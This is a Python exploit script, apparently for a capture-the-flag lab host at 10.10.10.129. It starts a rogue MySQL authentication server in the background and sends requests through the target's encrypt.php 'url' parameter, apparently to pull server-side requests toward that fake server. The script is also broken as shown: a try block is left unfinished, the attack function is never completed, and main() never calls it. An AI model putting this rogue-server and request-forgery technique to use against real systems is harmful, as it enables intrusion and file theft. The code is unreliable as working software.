#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

import requests
import subprocess
import os
from bs4 import BeautifulSoup
import threading
import base64
import sys


def callfakeserv():
    subprocess.Popen(["python3", "MySQL-Auth-Server/MySQL-Auth-Server.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def interact():
    session = requests.session()
    baseurl_index = "http://10.10.10.129"

    def parse_to_get(params, elem_type, elem_attr, isPredefined):
        htmlsrc = BeautifulSoup(params, "lxml")
        if isPredefined:
            return htmlsrc.find(elem_type, elem_attr).get("value")
        else:
            return htmlsrc.find(elem_type, elem_attr).text

    def write_data_to_fd(name, mode, content):
        with open(name, mode) as fd:
            fd.write(content)

    def build_payload(params, iptdata):
        baseurl = "http://10.10.10.129/encrypt.php?cipher=RC4&url="
        query = baseurl + params
        req = session.post(query, data=iptdata)
        return parse_to_get(req.content, "textarea", {"name": "textarea"}, False)

    try:
        req = session.get(baseurl_index)
        token = parse_to_get(req.content, "input", {"name": "token"}, True)




def main():
    if os.path.isdir("MySQL-Auth-Server"):
        pass
    else:
        print("Dependencies not exist, please clone the whole repo.")
        sys.exit(1)


if __name__ == '__main__':
    main()